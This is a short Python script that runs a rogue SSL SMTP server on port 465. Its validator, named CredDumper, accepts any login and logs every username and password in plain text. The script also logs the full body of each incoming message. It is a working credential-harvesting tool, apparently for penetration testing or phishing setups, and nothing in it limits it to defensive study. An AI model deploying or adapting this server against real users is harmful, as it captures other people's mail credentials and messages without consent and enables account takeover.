#!/usr/bin/env python

import logging as log
from secure_smtpd import SMTPServer, LOG_NAME

log.getLogger(LOG_NAME)

log.addLevelName(log.DEBUG, "[d]")
log.addLevelName(log.INFO,  "[+]")
log.addLevelName(log.ERROR, "[!]")
log.basicConfig(format='%(levelname)s %(message)s', level=log.INFO)

class CredDumper:
    def validate(self, user, passwd):
        log.info('[username]: ' +  user)
        log.info('[password]: ' +  passwd)
        return True

class SSLSMTPServer(SMTPServer):
    def process_message(self, peer, mailfrom, rcpttos, message_data):
        log.info("")
        log.info("Start Mail:\n" + message_data)
        log.info("")

server = SSLSMTPServer(
    ('0.0.0.0', 465),
    None,
    require_authentication=True,
    ssl=True,
    certfile='certs/test.crt',
    keyfile='certs/test.key',
    credential_validator=CredDumper(),
    maximum_execution_time = 1.0
    )

server.run()
